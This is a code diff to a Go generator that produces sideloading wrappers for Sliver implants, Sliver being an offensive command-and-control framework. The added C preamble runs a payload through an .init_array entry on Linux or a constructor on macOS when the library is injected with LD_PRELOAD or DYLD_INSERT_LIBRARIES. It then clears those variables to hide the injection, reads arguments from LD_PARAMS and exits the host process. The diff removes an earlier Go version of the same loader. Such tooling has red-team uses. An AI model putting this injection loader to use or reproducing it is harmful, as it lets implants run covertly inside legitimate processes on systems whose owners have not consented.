@@ -1110,8 +1110,42 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	b.WriteString("package main\n\n")
 
 	// Sideload: CGO preamble for //export Run (must sit immediately above import "C").
+	// Linux/macOS follow Sliver Third Party Tools: .init_array / constructor + LD_PARAMS
+	// (EntryPoint is ignored on those platforms). See https://sliver.sh/docs/?name=Third+Party+Tools
 	if cfg.Sideload {
-		b.WriteString("/*\n#include <stdlib.h>\n*/\nimport \"C\"\n\n")
+		b.WriteString(`/*
+#include <stdlib.h>
+#include <unistd.h>
+
+//export Run
+extern void Run(char*);
+
+#if defined(__linux__)
+static void sliver_sideload_init(int argc, char **argv, char **envp)
+{
+	(void)argc; (void)argv; (void)envp;
+	unsetenv("LD_PRELOAD");
+	char *params = getenv("LD_PARAMS");
+	unsetenv("LD_PARAMS");
+	Run(params);
+	_exit(0);
+}
+__attribute__((section(".init_array"), used)) static typeof(sliver_sideload_init) *sliver_sideload_init_p = sliver_sideload_init;
+#elif defined(__APPLE__)
+__attribute__((constructor)) static void sliver_sideload_init(int argc, char **argv, char **envp)
+{
+	(void)argc; (void)argv; (void)envp;
+	unsetenv("DYLD_INSERT_LIBRARIES");
+	char *params = getenv("LD_PARAMS");
+	unsetenv("LD_PARAMS");
+	Run(params);
+	_exit(0);
+}
+#endif
+*/
+import "C"
+
+`)
 	}
 
 	// Imports — PE section mode uses debug/pe + zlib instead of embed.
@@ -1271,7 +1305,8 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	b.WriteString("}\n\n")
 
 	if cfg.Sideload {
-		// Windows Sideload: implant dlopen + calls exported Run(char*).
+		// Windows: implant calls exported Run(char*).
+		// Linux/macOS: C .init_array / constructor (above) calls Run, then _exit.
 		b.WriteString("//export Run\n")
 		b.WriteString("func Run(cargs *C.char) {\n")
 		b.WriteString("\targs := []string{\"app\"}\n")
@@ -1279,24 +1314,8 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 		b.WriteString("\t\tif s := C.GoString(cargs); s != \"\" {\n")
 		b.WriteString("\t\t\targs = append(args, strings.Fields(s)...)\n")
 		b.WriteString("\t\t}\n")
-		b.WriteString("\t} else if v := os.Getenv(\"LD_PARAMS\"); v != \"\" {\n")
-		b.WriteString("\t\targs = append(args, strings.Fields(v)...)\n")
 		b.WriteString("\t}\n")
 		b.WriteString("\trunWithArgs(args)\n")
-		b.WriteString("}\n\n")
-		// Linux/Darwin Sideload: implant uses LD_PRELOAD + LD_PARAMS and does
-		// NOT call EntryPoint. Auto-run from init when preloaded, then exit so
-		// the host process (e.g. /bin/bash) does not continue into Result.
-		b.WriteString("func init() {\n")
-		b.WriteString("\tif os.Getenv(\"LD_PRELOAD\") == \"\" {\n")
-		b.WriteString("\t\treturn\n")
-		b.WriteString("\t}\n")
-		b.WriteString("\targs := []string{\"app\"}\n")
-		b.WriteString("\tif v := os.Getenv(\"LD_PARAMS\"); v != \"\" {\n")
-		b.WriteString("\t\targs = append(args, strings.Fields(v)...)\n")
-		b.WriteString("\t}\n")
-		b.WriteString("\trunWithArgs(args)\n")
-		b.WriteString("\tos.Exit(0)\n")
 		b.WriteString("}\n\n")
 		b.WriteString("func main() {}\n\n")
 	}
